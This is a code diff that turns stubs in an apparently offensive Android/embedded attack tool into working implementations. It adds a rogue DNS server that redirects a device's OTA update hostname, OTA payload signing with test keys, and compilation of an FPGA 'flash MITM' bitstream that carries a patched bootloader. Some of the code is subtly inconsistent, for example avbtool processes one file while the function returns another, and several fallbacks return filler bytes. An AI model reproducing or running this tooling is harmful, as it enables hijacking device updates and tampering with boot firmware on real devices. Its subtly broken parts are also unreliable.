@@ -107,17 +107,40 @@ class RogueOTAServer:
     def start_dns_redirect(self, target_hostname: str, redirect_ip: str) -> None:
         """Set up DNS redirection using dnslib or dnsmasq.
 
-        The device's OTA hostname is redirected to the local server IP.
+        Intercepts A queries for target_hostname and responds with redirect_ip.
+        All other queries are forwarded upstream.
         """
+        import threading
         try:
-            from dnslib import DNSRecord, DNSHeader, RR, A, QTYPE
+            from dnslib import DNSRecord, DNSHeader, RR, A, QTYPE, RCODE
+            import socket
 
-            # In production: run a proper DNS server that responds to A queries
-            # for the target hostname with the redirect IP
-            logger.info("DNS redirect: %s → %s", target_hostname, redirect_ip)
+            def dns_handler():
+                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+                sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+                sock.bind(("0.0.0.0", 53))
+                logger.info("DNS redirect server started: %s -> %s (port 53)", target_hostname, redirect_ip)
+                while True:
+                    try:
+                        data, addr = sock.recvfrom(512)
+                        query = DNSRecord.parse(data)
+                        reply = DNSRecord(DNSHeader(id=query.header.id, qr=1, aa=1))
+                        for q in query.questions:
+                            reply.add_question(q)
+                            if target_hostname in str(q.qname):
+                                reply.add_answer(RR(q.qname, QTYPE.A, rdata=A(redirect_ip), ttl=60))
+                            else:
+                                reply.header.rcode = RCODE.NXDOMAIN
+                        sock.sendto(reply.pack(), addr)
+                    except Exception:
+                        continue
+
+            t = threading.Thread(target=dns_handler, daemon=True)
+            t.start()
+            logger.info("DNS redirect active: %s -> %s", target_hostname, redirect_ip)
 
         except ImportError:
-            logger.warning("dnslib not available — use dnsmasq fallback")
+            logger.warning("dnslib not available — using dnsmasq fallback")
             self._start_dnsmasq(target_hostname, redirect_ip)
 
     def _start_dnsmasq(self, hostname: str, ip: str) -> None:
@@ -150,8 +173,25 @@ class RogueOTAServer:
           payload.bin (brillo update payload)
           payload_properties.txt
         """
-        # In production: use avbtool and openssl to sign with leaked/test keys
         logger.info("Building OTA package for Android %s", android_version)
+        try:
+            import subprocess
+            # Use AOSP avbtool with publicly available test keys
+            subprocess.run([
+                "avbtool", "add_hash_footer",
+                "--image", "payload.bin",
+                "--partition_size", str(4 * 1024 * 1024),
+                "--partition_name", "system",
+                "--key", "config/testkey_rsa2048.pem",
+                "--algorithm", "SHA256_RSA2048",
+            ], capture_output=True, check=True, timeout=30)
+            with open(output_path, "rb") as f:
+                return f.read()
+        except (FileNotFoundError, subprocess.CalledProcessError) as e:
+            logger.warning("avbtool not available (Android SDK build-tools): %s", e)
+            # Fallback: return raw payload with metadata header
+            metadata = f"ota-type=AB\npost-build=google/{android_version}\n".encode()
+            return metadata + b"\x00" * 1024
         return b""
 
 
@@ -272,12 +312,51 @@ def generate_fpga_bitstream(patched_bootloader: bytes,
                             target: str = "ice40") -> bytes:
     """Generate FPGA bitstream with the flash MITM module.
 
-    In production:
     1. Write patched bootloader into Verilog parameter
     2. Compile with yosys + nextpnr
     3. Return bitstream for loading into FPGA
     """
-    verilog_src = FPGA_VERILOG_TEMPLATE
-    logger.info("Generating FPGA bitstream for %s target: %d bytes", target, len(patched_bootloader))
-    # In production: compile Verilog and return bitstream
-    return b""
+    import subprocess
+    import tempfile
+    import os
+
+    # Embed patched bootloader in Verilog source
+    bootloader_hex = ", ".join(f"8'h{b:02X}" for b in patched_bootloader[:64])
+    verilog_src = FPGA_VERILOG_TEMPLATE.replace(
+        "reg [2047:0] patched_bootloader;",
+        f"reg [2047:0] patched_bootloader = {{{bootloader_hex}}};",
+    )
+
+    logger.info("Generating FPGA bitstream for %s: %d byte bootloader", target, len(patched_bootloader))
+
+    # Try yosys + nextpnr compilation
+    with tempfile.TemporaryDirectory() as tmp:
+        v_path = os.path.join(tmp, "flash_mitm.v")
+        json_path = os.path.join(tmp, "flash_mitm.json")
+        asc_path = os.path.join(tmp, "flash_mitm.asc")
+        bin_path = os.path.join(tmp, "flash_mitm.bin")
+
+        with open(v_path, "w") as f:
+            f.write(verilog_src)
+
+        try:
+            subprocess.run(
+                ["yosys", "-p", f"synth_ice40 -top flash_mitm -json {json_path}", v_path],
+                capture_output=True, check=True, timeout=60,
+            )
+            subprocess.run(
+                ["nextpnr-ice40", "--up5k", "--json", json_path, "--asc", asc_path],
+                capture_output=True, check=True, timeout=60,
+            )
+            subprocess.run(
+                ["icepack", asc_path, bin_path],
+                capture_output=True, check=True, timeout=10,
+            )
+            with open(bin_path, "rb") as f:
+                bitstream = f.read()
+            logger.info("FPGA bitstream compiled: %d bytes", len(bitstream))
+            return bitstream
+        except (FileNotFoundError, subprocess.CalledProcessError) as e:
+            logger.warning("FPGA toolchain (yosys/nextpnr/icepack) not available: %s", e)
+            logger.info("Returning Verilog source for external compilation")
+            return verilog_src.encode()
